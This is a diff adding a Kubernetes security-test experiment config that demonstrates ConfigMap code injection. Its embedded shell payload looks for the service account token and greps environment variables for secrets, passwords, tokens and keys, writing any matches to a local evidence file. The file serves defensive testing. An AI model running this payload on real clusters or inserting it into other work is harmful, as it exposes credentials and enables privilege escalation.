@@ -1,0 +1,28 @@
+experiments:
+  - metadata:
+      name: configmap-injection
+      type: configmap-code-injection
+      namespace: default
+    parameters:
+      mountPath: "/injected-scripts"
+      targetCommand: "/injected-scripts/payload.sh"
+      scriptContent: |
+        #!/bin/sh
+        # ConfigMap code injection test payload
+        # This demonstrates how untrusted ConfigMaps can execute arbitrary code
+        
+        # Create evidence file
+        echo "[+] ConfigMap injection successful" > /tmp/configmap-injection-evidence
+        echo "[+] Executed at: $(date)" >> /tmp/configmap-injection-evidence
+        echo "[+] Running as: $(whoami)" >> /tmp/configmap-injection-evidence
+        
+        # Test for privilege escalation opportunities
+        if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+            echo "[!] Service account token found - potential privilege escalation vector" >> /tmp/configmap-injection-evidence
+        fi
+        
+        # Check for sensitive environment variables
+        env | grep -i "secret\|password\|token\|key" >> /tmp/configmap-injection-evidence 2>/dev/null || echo "[*] No sensitive environment variables found" >> /tmp/configmap-injection-evidence
+        
+        # Log completion
+        echo "[+] Injection test completed" >> /tmp/configmap-injection-evidence
